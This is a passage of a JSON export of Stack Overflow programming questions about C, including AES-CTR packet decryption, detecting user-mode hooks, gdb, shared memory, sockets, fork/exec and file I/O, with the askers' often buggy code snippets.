k&lt;inLen/2;k++){\n            resChar[k]=(char)resInt[k];\n    }\n    return resChar;\n}\n\nint chartoint(char car){\n    int intero = 0;\n    intero = car - '0';\n    if(intero &lt; 10 &amp;&amp; intero &gt; -1)\n            return intero;\n    else\n            return car - 'a' + 10; \n}\n\nvoid main(){        \n\n    unsigned char * po = extochar(\"00\",2);\n    unsigned char * a2 = extochar(\"0012f0be7301\",12);\n    unsigned char * pn = extochar(\"000000000052\",12);\n    unsigned char * nonce= malloc(13);\n    char * hextk= \"15b1657878b1d12c93b4e073e42b629a\";\n    unsigned char * tk= extochar(hexstr, strlen(hextk));\n    init_ctr(&amp;status, nonce);\n\n    nonce[0]=po[0];        \n    nonce[1]=a2[0];\n    nonce[2]=a2[1];\n    nonce[3]=a2[2];\n    nonce[4]=a2[3];\n    nonce[5]=a2[4];\n    nonce[6]=a2[5];\n    nonce[7]=pn[0];\n    nonce[8]=pn[1];\n    nonce[9]=pn[2];\n    nonce[10]=pn[3];\n    nonce[11]=pn[4];\n    nonce[12]=pn[5];\n\n    AES_KEY aes_key;\n    if(AES_set_encrypt_key(tk, 128, &amp;aes_key))\n            exit(-1);\n    //encrypted payload\n    char * ext_crypt = \"146a056e3b20ece434594373a0e4fcbc83114c9a1bc158ecc4ca6bb449d6ec8468c8e08af3f4f33ce961f7b42c7651e22042e0bf39bd864a1b5f1035af5a54986183ee79446e3fb80a6f9bbb7a0177f557ce192c5515bd3a671b73464b9cf0fb817fd614987b65c0e20d753dedab8bf1934294e112cb865effb14724a2c66fcc7956f8fcfb0f7f2e539fbbf4e30c08fc18d10eb143510eae8b88e911c1cee773b73cdaf6d45151ad01fb2e2f5aa014510a\";\n    int msg_len= strlen(ext_crypt)/2 - 12;\n    unsigned char * crypt =  extochar(ext_crypt, strlen(ext_crypt));\n    AES_ctr128_encrypt(crypt, cleartxt, msg_len, &amp;aes_key, status.ivec, status.ecount, &amp;status.num);\n\n}\n</code></pre>\n\n<p>The output should be something like that:\n-SEARCH * HTTP/1.1\nHOST: 239.255.255.250:1900\nMAN: \"ssdp:discover\"\nMX: 2\nST: urn:schemas-upnp-org:service:WANPPPConnection:1</p>\n\n<p>I pasted the source of the encrypted packet here: <a href=\"http://pastebin.com/RvkfSt54\" rel=\"nofollow\">http://pastebin.com/RvkfSt54</a>\nare there any problems in the code or in the data, and how can I solve them?\nthanks a lot!</p>\n"},{"tags":["c","windows","winapi","visual-c++","hook"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":54,"score":1,"question_id":13227793,"title":"Detection Of User-Mode Hooks","body":"<p>Is there a way (programmatically) to detect the <strong>List of User-Mode Hooks</strong> ? I have tried reading some articles related but could not get through. Any pointers or ideas or samples would be of great help. As I have not till now started the code, so feel free to help me either in C or C++. TIA.</p>\n\n<p><strong>EDIT::</strong> I am trying with an approach to enumerate all the processes currently running and then again enumerating all the modules each of the process uses. What I really want to try(as explained by some experts) is to compare the enumerated list of all modules currently loaded into memory and the list of modules on the disk of each process to check for hooking. Would somebody please shed light on this? I do not know what my question is but if you got what my confusion is, please help me out here.</p>\n"},{"tags":["c","shared-memory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13249037,"title":"Shared Memory when it's for read only","body":"<p>I am reading <a href=\"http://beej.us/guide/bgipc/output/html/multipage/shm.html\" rel=\"nofollow\">beej's guide for Shared Memory Segments</a></p>\n\n<p>At the end he says:</p>\n\n<p>More commonly, a process will attach to the segment and run for a bit while other programs are changing and reading the shared segment. It's neat to watch one process update the segment and see the changes appear to other processes. Again, for simplicity, the sample code doesn't do that, but you can see how the data is shared between independent processes.</p>\n\n<p>My question is: it is necessary when the shared memory is for read only?</p>\n"},{"tags":["c++","c","gdb"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13246975,"title":"How do I set a break point on the exact line number in a shared library?","body":"<p>I have a source file shared_lib_test.c in which there's some code like below:</p>\n\n<pre><code>10 void test_function(void)\n11 {\n12    do_me();\n13    skip_me();\n14    return;\n15 }\n</code></pre>\n\n<p>I want to use the gdb to skip the line 13, how should I do this? This function belongs to a shared library not a binary.</p>\n\n<p>If this function belongs to a binary then I could use the following command to do it:</p>\n\n<pre><code>b shared_lib_test.c:13\ncommands 1\njump 14\ncontinue\nend\n</code></pre>\n\n<p>But as it belongs to shared library, I could not set a break point on the exact line number of the source file, I tried 'b test_function +2' but it seems illegal to gdb.</p>\n"},{"tags":["c","declaration"],"answer_count":4,"favorite_count":2,"up_vote_count":10,"down_vote_count":0,"view_count":108,"score":10,"question_id":13247473,"title":"Figuring out C Declarations","body":"<p>I'm fairly new to to C, and I'm trying to figure out some C declarations. Can someone help me explain the meaning of these C declarations?</p>\n\n<pre><code>double (*b)[n];\ndouble (*c[n])();\ndouble (*d())[n];\n</code></pre>\n\n<p>I appreciate the help!</p>\n"},{"tags":["android","c","android-ndk","jpeg"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13233409,"title":"save rgb pixels array to jpeg within NDK","body":"<p>Is there any C function in Android NDK, in order to save a RGB array into a jpeg file?</p>\n"},{"tags":["c","linux","ipc","shared-memory"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13248157,"title":"shmat for attaching shared memory segment","body":"<p>When I looked through the man pages of <code>shmat</code>. It is described as the primitive function of the API is <strong>to attach  the memory segment associated wih <code>shmid</code> it to the calling process' address space</strong> .</p>\n\n<p>The questions I have are the following.</p>\n\n<ul>\n<li>The term <strong>attach</strong> looks generic to me. I find difficulties in understanding what is the <strong>underlying acivity</strong> that attach refers to.?</li>\n<li>What it means by <strong>mapping a segment of memory</strong>?</li>\n</ul>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13248610,"title":"File I/O in C,unable to delete the previously written data","body":"<p>I want to delete the previously written data on a text file where i want to write my new data.How it can be done.I am able to write a data in a file but unable to delete the previously written content.Need help</p>\n"},{"tags":["c++","c","tiff","libtiff"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13248377,"title":"C/C++ library for TIFF 6.0 and TTN2","body":"<p>Does anyone here know of a library where we could encode/decode TIFFv6 and TTN2?</p>\n\n<p>It should be something we could use to ateast be able to convert bmp to these files and v.v.</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","calloc"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13247988,"title":"Return type as a two dimensional array","body":"<p>The following piece of code gives an error for conflicting types of function fun2() when compiled.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nchar ***  fun(){\n    char *** b;\n    calloc(10,sizeof(char **));\n    b[0]=fun2();\n    return b;\n}\n\nchar ** fun2(){\n    char **a;\n    a=calloc(10,sizeof(char*));\n    a[0]=calloc(10,sizeof(char));\n    return a;\n}\nmain(){\n    char **c;\n    c=fun();\n}    \n</code></pre>\n\n<p>However, this piece of code does not -</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nchar ***  fun(){\n    char *** b;\n    calloc(10,sizeof(char **));\n    b=fun2();\n    char **a;\n    a=calloc(10,sizeof(char*));\n    a[0]=calloc(10,sizeof(char));\n    return a;\n}\n\nmain(){\n    char **c;\n    c=fun();\n}\n</code></pre>\n\n<p>But, both the program are doing the same task. What is the reason behind the compilation error?</p>\n"},{"tags":["c","gtk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13237716,"title":"Splash Screen in GTK","body":"<p>I'm new to GTK and i'm using it to create UI in C. I've created a splash screen and i'm able to close it after specified seconds using the function <code>g_timeout_add(100, function_to_call, NULL);</code>. The Splash screen works great. but the problem is when in extend my program further (i.e) After closing the splash screen I want another window to be displayed automatically, it doesn't happen so. Both the windows open together. Here is my program.</p>\n\n<pre><code>gboolean function_to_call(gpointer data){\n    gtk_quit_main();\n    return(FALSE);\n}\nint main (int argc, char *argv[]){\n    GtkWidget *window, *image, *another_window;\n    gtk_init(&amp;argc, &amp;argv);\n    .\n    .\n    .\n    .\n    .\n    .\n    .\n    g_timeout_add (100, function_to_call, NULL);\n    gtk_main ();\n    /*if my program is till this, splash screen closes after 1 sec . But when i try\n     *to define another window from here onwards and call gtk_widget_show() and gtk_main() \n     *again for another_ window, window and another_window both open together and window  \n     *doesn't close after 1 sec. */\n}\n</code></pre>\n\n<p>Any kind of help is appreciatable.<br>\nThank you. </p>\n"},{"tags":["c","linux","linux-kernel","linux-device-driver","kernel-module"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":13248209,"title":"sk_buff copy & sk_buff clone","body":"<p>i m writing a module for linux kernel &amp; it try to steal the packet &amp; its related <strong>sk_buff</strong>. to do so i want to use <code>struct sk_buff *skb_copy(const struct sk_buff *skb, gfp_t gfp_mask)</code> &amp; then pass the return type to the kernel as <strong>packet is dropped</strong>.</p>\n\n<p>so when kernel gets the info about packet drop it try to free the sk_buff. here my question comes will it affect my newly copied skb &amp; its pointed data of the packet? or now i can play with my new sk_buff?</p>\n\n<p>or is it possible to use <strong>skb_clone()</strong> &amp; use the packet data part without deleting the referenced data by old sk_buff because it will reduse copying cost of the packet.</p>\n"},{"tags":["sql","c","web-services","embedded","point-of-sale"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13227288,"title":"web service access in mobile POS device","body":"<p>i have a web service which  will  return a single dimensions array  or string, if some parameters are passed to it eg,(1,1, ,dd/mm/yyyy hh:mm).It would be really helpful if iam able to get some idea on how this web service can be accessed from a gprs enabled mobile device (Point of sale- ARM9 device with 256MB of NAND flash for the Operating System,\nUser application and the remaining for the user data[Files, Databases and other\nuser requirement].\n ) using <strong>C</strong>( as it is having its self-diagnosing  application developed in C (host os- fedora) for displaying menus,printing bills etc which i also need in my project).i need to store this accessed data temporarily as text file in this device itself for later use.im quite new in this and i couldnt find anything useful on POS software development.so pls help as i cant go forward in developing without proper understanding.pls pardon for posting this here.thanks in advance.</p>\n\n<p>ps:I  mainly need Help  in the portion of temporary storage of data from the web service on the device (to work off-line) and query it when needed.</p>\n"},{"tags":["c","arm","cross-compiling","gstreamer"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12935355,"title":"Crosscompile GStreamer, Farstream for ARM11","body":"<p>I'm looking for a way to crosscompile GStreamer, Farstream and a small example using those libraries. I need to know a few things:</p>\n\n<ul>\n<li>What is the best way for crosscompiling those libraries for ARM11? I have been searching some information in Google and the solution has something to do with installing an arm compiler (that was already obvious) and then playing with <code>./configure</code>, but I'm not really sure what exactly should be passed as parameters.</li>\n<li>Once compiled the libraries, how can I <em>install</em> them in the ARM11 device? I mean, what's the next step after running <code>./configure &lt;options for arm11&gt;</code> and <code>make</code>?</li>\n<li>How can I link the example with the libraries that I compiled for the ARM11 device instead of the libraries installed in my system?</li>\n</ul>\n\n<p>Regards</p>\n\n<p>EDIT</p>\n\n<p>Sorry for not saying. I'm working on Arch Linux x64 and the target device is running Linux too.</p>\n"},{"tags":["c","uclinux"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":35,"score":-1,"question_id":13247950,"title":"call library function","body":"<p>I use uCLinux and C/C++.I compiled my own static library module (called \"MyLib.a\").How can I use a function defined in this library directly in my source code.I don't want to link this library in my makefile.I want to use this library directly in my source code .Is there a function or an instruction to do that.(For example something like \"pragmas\" directives as it is in Visual Studio)\n Thanks a lot!</p>\n"},{"tags":["c","windows","gcc","export","main"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13247493,"title":"Trying to understand the main function with GCC and Windows","body":"<p>They say that <em>main()</em> is a function like any other function, but \"marked\" as an entry point inside the binary, an entry point that the operating system may find (<strong>Don't know how</strong>) and start the program from there. So, I'm trying to find out more about this function. What have I done? I created a simple .C file with this code inside:</p>\n\n<pre><code>int main(int argc, char **argv) {\n     return (0);\n}\n</code></pre>\n\n<p>I saved the file, installed the GCC compiler (in Windows, MingW environment) and created a batch file like this:</p>\n\n<pre><code>gcc -c test.c -nostartfiles -nodefaultlibs -nostdlib -nostdinc -o test.o\ngcc -o test.exe -nostartfiles -nodefaultlibs -nostdlib -nostdinc -s -O2 test.o\n@%comspec%\n</code></pre>\n\n<p>I did this to obtain a very simplistic compiler and linker, no library, no header, just the compiler. So, the compiling goes well but the linking stops with this error:</p>\n\n<pre><code>test.c:(.text+0xa): undefined reference to '___main'\ncollect2.exe: error: Id returned 1 exit status\n</code></pre>\n\n<p>I thought that the main function is exported by the linker but I believed that you didn't need any library with additional information about it. But it looks like it does. In my case I supposed that it must be the standard GCC library, so I downloaded the source code of it and opened this file: <em>libgcc2.c</em>\nNow, I don't know if that is the file where the main function is constructed to be linked by GCC. In fact, I don't understand how the main function is used by GCC. Why does the linker need the gcc standard libraries? <strong>To know what about main?</strong> I hope this has made my question quite specific and clear. Thanks!</p>\n"},{"tags":["c","memory-management"],"answer_count":5,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":36,"score":3,"question_id":13247504,"title":"Scope of a variable. Internal working basic","body":"<p>This is a very basic question about the scope of a variable suppose. I have the fiollowing code:</p>\n\n<pre><code>int main()\n{\n    int *p;\n    p=func();\n    printf(\"%d\",*p);\n    return 0;\n}\n\nint *func()\n{\n   int i;\n   i=5;\n   return &amp;i;\n}\n</code></pre>\n\n<p>My question</p>\n\n<ul>\n<li>The scope of i is finished in <code>func()</code> but, since I am returning the address of <code>i</code> will I be able to access and <code>print</code>5 in <code>main()</code>?</li>\n<li>If not, why? does the compiler puts a garbage value in that address space (I don't think this is done).</li>\n<li>What actually it means by <strong><code>the scope of a variable is ended</code></strong> ? Also does the memory allocated to <code>i</code> is freed when its scope ends?</li>\n</ul>\n"},{"tags":["c","eclipse","misra"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":13028048,"title":"Telling VX-Tasking that \"bool\" in a boolean?","body":"<p>I'm using the Tasking VX toolset (built on Eclipse) and have a fairly basic but fundamental problem that I can't get around... I've RTFMed and am still totally none the wiser.</p>\n\n<p>Imagine the simple snippet of code:</p>\n\n<pre><code>#include &lt;stdbool.h&gt;\n\nbool myFlag = false;\n</code></pre>\n\n<p>If I enable MISRA-C checking, I get the following:</p>\n\n<pre><code>MISRA-C rule 10.1 violation: [R] restrict the use of implicit conversions for integer types\n</code></pre>\n\n<p>Eclipse is set up as a C99 implementation, and as per the <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdbool.h.html\" rel=\"nofollow\">standard library definition</a>, <code>stdbool.h</code> is defined as:</p>\n\n<pre><code>#define bool  _Bool\n#define true  1\n#define false 0\n</code></pre>\n\n<p>I'm assuming that this error is because <code>#define false 0</code> and the tool is implicitly converting to bool?</p>\n\n<p>Note: if I cast the assignment, then the error is removed:</p>\n\n<pre><code> bool myFlag = (bool)false;\n</code></pre>\n\n<p>But (IMHO) that is masking the problem, not addressing it, and I really do not want to cast every assignment.</p>\n\n<p>Tools such as LINT allow you to specify the bool type to stop these sort of false positives... I need the equivalent for Eclipse/Tasking</p>\n\n<hr>\n\n<p>So my question is this:</p>\n\n<p><strong>I suspect that somewhere there is a tool option to tell TASKING that <code>bool</code> is the boolean type, and therefore <code>false</code> and <code>true</code> are OK to be used?</strong></p>\n\n<p>Is there?</p>\n\n<p>{Please no discussions [on this thread] about the merits (or otherwise) of MISRA}</p>\n"},{"tags":["c++","c","windows","winapi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":115,"score":-5,"question_id":13216671,"title":"How to get size of a loaded icon in c++ winapi","body":"<p>i have loaded an icon <code>(\"c:\\test.ico\")</code> using <code>LoadImage()</code> function\nhow can i get the size of this icon? (number of bytes in it)\ni am using c++ &amp; winapi</p>\n\n<pre><code>HRSRC hRes = LoadImage ( NULL, icon, IMAGE_ICON, 0, 0, LR_LOADFROMFILE );\nLPVOID lpResLock = LockResource(hRes);\n</code></pre>\n\n<p>(more precisely, size of data pointed to by \"lpResLock\")</p>\n\n<p>========update======\ni know about <code>sizeofresource()</code> But the problem is, its to load resource from an executable files. As i shown in my question, i am loading a standalone- local resource from disk file. Second issue is, the <code>hResInfo</code> parameter must have to be created using <code>FindResource</code> function, in my case i am using <code>LoadImage()</code>.. So this cant be of help</p>\n"},{"tags":["c","process"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":49,"score":-2,"question_id":13246570,"title":"How to open a process in C?","body":"<p>How do I open a process that isn't connected with my program in C?\nfor example:\nif the user enter the following input:\nstart C:\\Windows\\calc.exe</p>\n\n<p>then the calculator will open.\nthanks.</p>\n"},{"tags":["c","opencv","k-means","opticalflow"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":214,"score":0,"question_id":10907256,"title":"grouping motion vectors","body":"<p>I am using -Lucas-kanade algorithm to calculate the optical flow of a video sequences with openCV. I got the motion vectors. Now I want to group those motion vectors in some clusters.\nthe vectors which are near by each other I want to group them together. Some thing like nearest neighbor approach. But I don't know how I can implement the same. any help will be appreciated.</p>\n\n<p>Thank you.</p>\n\n<p>I used cvKMeans2() to group the corner points after running the optical flow algorithm...</p>\n\n<p>I have the clusters in a vector of vectors clustercontainer. Now I want to draw a boundary line around every clusters..I am not sure how can I do so...if anybody knows please help.</p>\n\n<p>Using the below code from openCV manual I draw the circle around every cluster..but I want to draw rectangle rather than a  circle..any body please help me.</p>\n\n<pre><code>    for(int h = 0; h &lt; clusterContainer.size(); h++ )\n        {\n\n           CvPoint pt1,pt2;\n               CvMat box[100];\n\n           pt1.x=(int)points-&gt;data.fl[h*2];\n           pt1.y=(int)points-&gt;data.fl[h*2+1];\n              cvCircle( frame1, pt1, 20, CV_RGB(255,255,0),4);\n\n}\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/3zgmF.jpg\" alt=\"enter image description here\"></p>\n"},{"tags":["c","linux","sockets","tcp"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":13247264,"title":"Reading wrong data from TCP socket","body":"<p>I'm trying to send data blockwise over a TCP socket. The server code does the following:</p>\n\n<pre><code>#define CHECK(n) if((r=n) &lt;= 0) { perror(\"Socket error\\n\"); exit(-1); }\nint r;\n\n//send the number of blocks\nCHECK(write(sockfd, &amp;(storage-&gt;length), 8)); //p-&gt;length is uint64_t\n\nfor(p=storage-&gt;first; p!=NULL; p=p-&gt;next) {\n  //send the size of this block\n  CHECK(write(sockfd, &amp;(p-&gt;blocksize), 8)); //p-&gt;blocksize is uint64_t\n\n  //send data\n  CHECK(write(sockfd, &amp;(p-&gt;data), p-&gt;blocksize));\n}\n</code></pre>\n\n<p>On the client side, I read the size and then the data (same CHECK makro):</p>\n\n<pre><code>CHECK(read(sockfd, &amp;block_count, 8));\nfor(i=0; i&lt;block_count; i++) {\n  uint64_t block_size;\n  CHECK(read(sockfd, &amp;block_size, 8));\n\n  uint64_t read_in=0;\n  while(read_in &lt; block_size) {\n    r = read(sockfd, data+read_in, block_size-read_in); //assume data was previously allocated as char*\n    read_in += r;\n  }\n}\n</code></pre>\n\n<p>This works perfectly fine as long as both client and server run on the same machine, but as soon as I try this over the network, it fails at some point. In particular, the first 300-400 blocks (à ~587 bytes) or so work fine, but then I get an incorrect block_size reading:</p>\n\n<pre><code>received block #372 size : 586\nread_in: 586 of 586\nreceived block #373 size : 2526107515908\n</code></pre>\n\n<p>And then it crashes, obviously.\nI was under the impression that the TCP protocol ensures no data is lost and everything is received in correct order, but then how is this possible and what's my mistake here, considering that it already works locally?</p>\n"},{"tags":["c","linux","kernel","arm","dma"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13245628,"title":"How do the writing to an HW controller register and DMA work on ARM arch machines?","body":"<p>while calling this function:</p>\n\n<pre><code>static inline void writel(unsigned int v, volatile void __iomem *addr)\n{\n    *(volatile unsigned int __force *)addr = cpu_to_le32(v);\n}\n</code></pre>\n\n<ol>\n<li>Does the address is absoulute or pass through the MMU?</li>\n<li>DMA - does writing to address is translated by the MMU?</li>\n<li>Why the registers address in the system aren't mentioned <a href=\"http://www.arm.linux.org.uk/developer/memory.txt\" rel=\"nofollow\">here</a>?</li>\n</ol>\n"},{"tags":["c","pointers","notation","getchar","pure"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13246876,"title":"Can't get user input using getchar() and pointer notation in C","body":"<p>I'm changing a program from normal array notation to pure pointer notation and I can't receive user input using getchar() in a while loop. I printed out was the program was receiving and it output upside down question marks. I wasn't sure why this was happening because I never changed the variable type. The problem is in the second function to receive user input. Thank you for the help. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n/* Function prototypes */\nvoid fillS1(char * x);\n\nvoid fillS2(char * x, char * y, char z);\n\nvoid strFilter(char * a, char * b, char c);\n\nint main(int argc, const char * argv[])\n  {\n    char s1[42];\n    char s2[22];\n    char x = 0;\n\n    fillS2(s2, s1, x);\n\n    return 0;\n}\n\n/* Function to generate a random string of 40 uppercase letters */\nvoid fillS1(char randomlyGeneratedString[])\n{\nchar * pointerToRandom = randomlyGeneratedString;\nint i;\n\nfor (i = 0; i &lt; 40; i++) {\n    *(pointerToRandom + i) = 'A' + rand() % 26;\n}\npointerToRandom[40] = (char)0;\n\n//printf(\"This is the generated string %s\\n\", pointerToRandom);\n\n}\n\n/* Function to get user input of characters */\nvoid fillS2(char userString[], char randomString[], char replacementCharacter)\n{\n\nchar * pointerToUserString = userString;\nchar * pointerToRandom = randomString;\n\n\nint i = 0;\nint n = 0;\nint capitalLetterCheck = 0;\n\nchar loopContinue = 0;\nchar copyString[42];\n\nchar * pointerToCopyString = copyString; \n\nfillS1(pointerToRandom);\n\ndo {\n\n    /* For loop to copy the first randomly generated string */\n    for(i = 0; i &lt; 42; i++)\n        *(pointerToCopyString + i) = *(pointerToRandom + i);\n\n    i = 0;\n    capitalLetterCheck = 0;\n\n    /* While loop to to get user input */\n    printf(\"Please enter at least 2 capital letters and a maximum of 20.\\n\");\n    while  (((*(pointerToUserString + i)) = getchar() != '\\n'))  {\n\n        /* Counter to determine how many characters were entered */\n        i++;\n\n    }\n\n    i++;\n\n    *(pointerToUserString + i) = '\\0';\n\n    //printf(\"This is the value if i %i\", i);\n    //printf(\"This is the user's string %s\", pointerToUserString);\n\n    /* Capital letter check */\n    for (n = 0; n &lt; 20; n++) {\n        if (((*(pointerToUserString + i)) &gt;= 'A') &amp;&amp; (*(pointerToUserString + i) &lt;= 'Z'))                  \n   {          \n            capitalLetterCheck++;\n        }\n    }\n\n    if (i &lt; 3) {\n        printf(\"You need at least two letters\\n\");\n    }\n\n    else if (i &gt; 21){\n        printf(\"You cannot have more than twenty letters\\n\");\n    }\n\n    else if (capitalLetterCheck &gt;= 2) {\n\n        puts(pointerToUserString);\n\n        printf(\"Enter a character to replace occuring letters.\\n\");\n        scanf(\"%c\", &amp;replacementCharacter);\n        getchar();\n\n        strFilter(pointerToCopyString, pointerToUserString, replacementCharacter);\n\n    }\n\n    else\n\n        printf(\"You  must have 2 capital letters.\\n\");\n\n\n    printf(\"Would you like to enter another string (y/n)?\\n\");\n    loopContinue = getchar();\n    getchar();\n\n\n} while (loopContinue != 'n' &amp;&amp; loopContinue != 'N');\n\n}\n\n/* Function to replace letters with the character chosen by the user */\nvoid strFilter(char a[], char b[], char c)\n{\nchar * pointerToA = a;\nchar * pointerToB = b;\n\n\nint i = 0;\nint n = 0;\n\nwhile (n &lt; 20) {\n\n    for (i = 0; i &lt; 40; i++) {\n        if ((*(pointerToA + i)) == *(pointerToB + n)){\n            *(pointerToA + i) = c;\n        }\n    }\n    i = 0;\n    n++;\n}\n\nputs(a);\n}\n</code></pre>\n"},{"tags":["c","pointers","runtime-error"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13246615,"title":"swap two pointers to exchange arrays","body":"<p>I have the following code which I want to make it so that board now has the value of new_board and vice versa. Since they are both pointers I thought I could just swap the addresses they point to. When I print in print2() the addresses are appropriately swapped. However, when I print in print1() the addresses have somehow swapped back, which doesn't make any sense to me. Further if I print out the values in the board at print2() they are also correct.</p>\n\n<pre><code>main(){\n  char *new_board = (char *)malloc(sizeof(char) * rows * cols );\n  char *board = (char *)malloc(sizeof(char) * rows * cols );\n  update_board2(board, new_board, rows, cols);\n  print1();\n}\n\nvoid update_board2(char *board, char *new_board, int rows, int cols){\n  //do a bunch of stuff\n  char *temp = board;\n  board = new_board;\n  new_board = temp;\n  print2();\n}\n</code></pre>\n"},{"tags":["c++","c","visual-studio-2010","dll"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13244910,"title":"Exporting functions in a dll. C and C++","body":"<p>I have an application called ProCharts that could read and access files from a C++ dll. Now\nif I add something like this and compile the dll in x64 mode.(VS2010->Win32 Console App->DLL)</p>\n\n<pre><code>int __stdcall Testb(int v)\n{\n    return v;\n}\n</code></pre>\n\n<p>and then define that in a <strong>def</strong> file .The function gets called from that App with no problems.</p>\n\n<p>However if I have something like this function in the same file (its name is also present in the def file)</p>\n\n<pre><code>int __stdcall AdvancedFunction(int v)\n{\n          //Calling a library that requires other libraries such as boost\n          return ..;\n}\n</code></pre>\n\n<p>then even the first function does not get called and the application calling the dll only states that there is an error with the dll. Could anyone tell me what might be going wrong ?I have placed all the dependencies with the dll file however I am still getting an error.\nI used dependency checker and it states that two functions are c functions and not C++ any suggestions or hints on how I could resolve this issue would highly be appreciated.</p>\n"},{"tags":["c","string","suffix-array","programming-pearls"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13245050,"title":"Why does this example use null padding in string comparisons? “Programming Pearls”: Strings of Pearls","body":"<p>In \"Programming Pearls\": Strings of Pearls, <a href=\"http://www.cs.bell-labs.com/cm/cs/pearls/sec153.html\" rel=\"nofollow\">section 15.3</a> (Generating Text), the author introduces how to generate random text from an input document. In the <a href=\"http://www.cs.bell-labs.com/cm/cs/pearls/markov.c\" rel=\"nofollow\">source code</a>, there are some things that I don't understand.</p>\n\n<pre><code>for (i = 0; i &lt; k; i++)\n        word[nword][i] = 0;\n</code></pre>\n\n<p>The author explains: \"After reading the input, we append k null characters(so the comparison function doesn't run off the end).\" This explanation really confuses me, since it still works well after commenting these two lines.  Why is this necessary?</p>\n"},{"tags":["c","linux","exec","fork","runtime-error"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13237992,"title":"child is not executing after fork()-ing","body":"<pre><code>int status=0;\nint PID = fork();\nif(PID == 0)\n{\n   char *path = strcat(pathToken,strcat(\"/\",command));\n   printf(\"path: %s\\n\",path);\n   execl(path,command,\"-l\",NULL);\n}\nelse if(PID&gt;0)\n{\n   printf(\"pid: %d. \",PID);\n   printf(\"I'm parent process\\n\");\n   wait(&amp;status);\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>pid: 20027. I'm parent process\n</code></pre>\n\n<p>Why it doesn't enter <code>if(PID==0)</code>?</p>\n"},{"tags":["c","fwrite","fread"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":13245413,"title":"fwrite in c going in an infinite loop","body":"<p>I am trying to update records in a .DAT file using fread and fwrite but somehow the loop runs infinitely.  My code is:</p>\n\n<pre><code>FILE *fq;\nEmployee eme;\nlong int recsize_eme;\nrecsize_eme=sizeof(eme);\n\nfq=fopen(\"EME.DAT\",\"rb+\");\nif(fq==NULL)\n{\n    fq=fopen( \"EME.DAT\",\"wb+\");\n    if(fq==NULL)\n    {\n        printf(\"Can't Open File\");\n        exit(EXIT_FAILURE);\n    }\n}\n\nrewind(fq);\nwhile(fread(&amp;eme,recsize_eme,1,fq)==1)\n{\n    if (compare_date(eme.pre_pay_date)==0 &amp;&amp; compare_date(eme.pol_end_date)!=0)\n    {\n        int date[3];\n        int n;\n        n = sscanf(eme.pre_pay_date, \"%d/%d/%d\", &amp;date[0], &amp;date[1], &amp;date[2]);\n        if(date[1]!=12)\n        {\n            date[1]++;\n        }\n        else\n        {\n            date[1]=1;\n            date[2]++;\n        }\n\n        snprintf(eme.pre_pay_date, sizeof(eme.pre_pay_date), \"%d/%d/%d\", date[0], date[1], date[2]);\n        printf( eme.pre_pay_date );\n        if (eme.pre_status!=0)\n        {\n            eme.pre_payment = eme.premium;\n        }\n        else\n        {\n            eme.pre_payment = eme.premium + eme.pre_payment;\n        }\n        printf( \"%f %f\\n\",eme.premium,eme.pre_payment );\n        fseek(fq,-recsize_eme,SEEK_CUR);\n        fwrite(&amp;eme,recsize_eme,sizeof(eme)/recsize_eme,fq);\n    }\n}\nfclose(fp);\n</code></pre>\n\n<p>the function if updating the values correctly but when writing it keeps on printing the values infinitely.  <strong>eme</strong> is an attribute of struct Employee which i have 